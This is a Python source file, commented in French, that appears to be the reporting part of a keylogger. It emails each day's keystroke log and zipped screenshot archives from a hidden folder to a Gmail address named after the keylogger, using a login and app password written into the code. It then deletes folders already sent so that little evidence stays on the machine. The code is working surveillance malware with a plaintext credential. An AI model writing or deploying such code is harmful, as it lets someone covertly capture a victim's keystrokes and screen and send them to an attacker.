import os
import datetime
import time
import shutil

from others.variables_param import NOM_DOSSIER_SECRET,AR1
if not os.path.exists(AR1):
	os.makedirs(AR1)

dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
dateheure = datetime.datetime.now().strftime('%H:%M:%S')
username = os.getlogin()

###########################################################
     ################### SEND ######################
###########################################################

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication
from email.mime.base import MIMEBase
from email import encoders

def email_alert(subject,body,to, liste_file=""):
    msg = MIMEMultipart()
    
    msg['subject'] = subject
    msg['to'] = to
    user = "KeyLoggerVeski@gmail.com"
    
    msg['from'] = user
    password = "sslezqomykvdhggd"
    
    msg.attach(MIMEText(body,'plain'))
    ok = True
    for filename in liste_file:
        if os.path.exists(filename):
            if filename[-4:] != ".zip":
                attachment = open(filename,"rb")
                part = MIMEBase('application','octet-stream')
                part.set_payload((attachment).read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition','attachment; filename=' + filename)
                msg.attach(part)
            else: #si fichier zip
                with open(filename,'rb') as f:
				 # Attach the file with filename to the email
                     msg.attach(MIMEApplication(f.read(), Name=filename.split('/')[-1]))
        else:
            ok = False
            print(filename + " : file not exist")
        
        
    if ok:
        server = smtplib.SMTP("smtp.gmail.com",587)
        server.starttls()
        server.login(user,password)
        server.send_message(msg)
    
        print("--> ###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
    else:
        print("- ! ###" + subject + " ! not send to KeyLoggerVeski@gmail.com")
    server.quit()
    return ok

def send_log_dossier(dateee):
	global dateheure
	
	dossierhier = NOM_DOSSIER_SECRET+"/"+dateee #le dossier
	nomfile_hier = username + " touch " + dateee + ".txt" #le fichier log
	if os.path.exists(dossierhier):
		
		if not os.path.exists(dossierhier +"/ok_sent.txt"): # si dans le dossier n'a pas été envoyé
			listefichiers = [f"{dossierhier}/{nomfile_hier}"] #le fichier log à envoyé
			
			colis = AR1 + "/" + dateee + ".zip"		#l'archive de photo à envoyé
			if os.path.exists(colis):
				print("colis",colis)
				listefichiers.append(colis)
			try:
				ok = email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
			except:
				ok = False
				print(listefichiers, "n'a pas été envoyé, erreur d'essai")
			
			#ok c'est fait, c'est noté
			if ok:
				fichierok = open(dossierhier+"/ok_sent.txt", "a") # ajouter un fichier ok_sent dans le dossier
				fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
				fichierok.close()
				print("## " + dossierhier+"/ok_sent.txt")
		else:
			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")
			
def main_email():
	
	
	for dos in os.listdir(NOM_DOSSIER_SECRET): #pour tous les dossier du data
		if dos != dateajd and os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos):
			send_log_dossier(dos)
			
		else:
			print(f" ! {dos} pas envoyé")				
	print("*fin main_mail*")
###########################################################
     ################### DELETE ######################
###########################################################
def remove_folder(path):

	# removing the folder
	if not shutil.rmtree(path):

		# success message
		print(f"{path} is removed successfully")

	else:

		# failure message
		print(f"Unable to delete the {path}")

def remove_file(path):
	print("*")
	# removing the file
	if not os.remove(path):

		# success message
		print(f"{path} is removed successfully")

	else:

		# failure message
		print(f"Unable to delete the {path}")
	print("***")

def get_file_or_folder_age(path):

	# getting ctime of the file/folder
	# time will be in seconds
	ctime = os.stat(path).st_ctime

	# returning the time
	return ctime

def main_delete(maximum):
	global NOM_DOSSIER_SECRET
	listeDossiersDates = [fic for fic in os.listdir(NOM_DOSSIER_SECRET)]
	listeDossiersDates.sort()
	print(listeDossiersDates)
	listeDossiersSupprimer = []
	n = len(listeDossiersDates)
	cpt = 0
	while n > maximum and cpt < n:
		dossierasuppr = NOM_DOSSIER_SECRET +"/"+ listeDossiersDates[0]
		if os.path.exists(dossierasuppr) and os.path.exists(dossierasuppr +"/ok_sent.txt"):
			remove_folder(dossierasuppr)
			listeDossiersSupprimer.append(dossierasuppr)
		listeDossiersDates = listeDossiersDates[1:]
		n = len(listeDossiersDates)
		cpt += 1
	print(" Dossier supprimer",listeDossiersSupprimer)
	print(" compteur affiche ",cpt)

def main_delete_ar1(maximum):
	global AR1
	print(AR1)
	listeDossiersDates = [fic for fic in os.listdir(AR1)]
	listeDossiersDates.sort()
	print(listeDossiersDates)
	listeDossiersSupprimer = []
	n = len(listeDossiersDates)
	while n > maximum:
		dossierasuppr = AR1 +"/"+ listeDossiersDates[0]
		if os.path.exists(dossierasuppr):
			remove_folder(dossierasuppr)
			listeDossiersSupprimer.append(dossierasuppr)
		listeDossiersDates = listeDossiersDates[1:]
		n = len(listeDossiersDates)
	print(" AR1 supprimer",listeDossiersSupprimer)

###########################################################
     ################### archives ######################
###########################################################	
'''
import zipfile


def go_zip_directory(dossierDate):
	
	nomduZip = AR1 + "/" + dossierDate.split("/")[-1] + ".zip"
	
	if not os.path.exists(nomduZip):
		mode = "w"
	else:
		mode = "a"
	
	print(" ~~~",dossierDate)	
	with zipfile.ZipFile(nomduZip,mode) as my_zip:
		dossierDate += "/screens"
		#
		#print(elems,my_zip.namelist())
		if os.path.exists(dossierDate):
			for img in os.listdir(dossierDate):
				my_zip.write(dossierDate + "/" + img)
				print(" ",img)

				


def ranger_zips():
	listezips = [fic for fic in os.listdir(NOM_DOSSIER_SECRET) if fic[-4:] == ".zip"]
	print(listezips)
	if len(listezips) > 0:
		 # le dossier archives
		if not os.path.exists(ARCHIVEGANG):
			os.makedirs(ARCHIVEGANG)
			
		for dos in listezips: #deplacer chaquer element dans le dossier archives
			origine = NOM_DOSSIER_SECRET +"/"+ dos
			destination = ARCHIVEGANG + "/"+ dos
			shutil.move(origine, destination)
	
	print("*rangerzips*")
def main_archive():
	#ranger_zips()
	for dos in os.listdir(NOM_DOSSIER_SECRET):	
		if os.path.isdir(NOM_DOSSIER_SECRET + "/"+dos): # c un dossier mgl
			if dos != dateajd or 1:
				go_zip_directory(NOM_DOSSIER_SECRET + "/"+ dos) #ziper le dossier
			else:
				print(f" veski * dossier de ajd {dos}")	
		else:
			print(f" veski * pas un dossier {dos}")	
	#ranger_zips()			

try:
	
	
	print(" ----------------------------------------> Yes main_archive")
except:
	print(" ----------------------------------------! ERREUR de main_archive")
	
main_archive()
############################################################################## MAIN
'''
'''
try:
	
	print(" ----------------------------------------> Yes main_email")
except:
	print(" ----------------------------------------! ERREUR de main_email")
'''
main_email()
try:
	main_delete(3)
	print(" ----------------------------------------> Yes main_delete")
except:
	print(" ----------------------------------------! ERREUR de main_delete")
try:
	main_delete_ar1(20)
	print(" ----------------------------------------> Yes main_delete_ar1")
except:
	print(" ----------------------------------------! ERREUR de main_delete_ar1")




staller = input("\n\n Press ENTER to close")
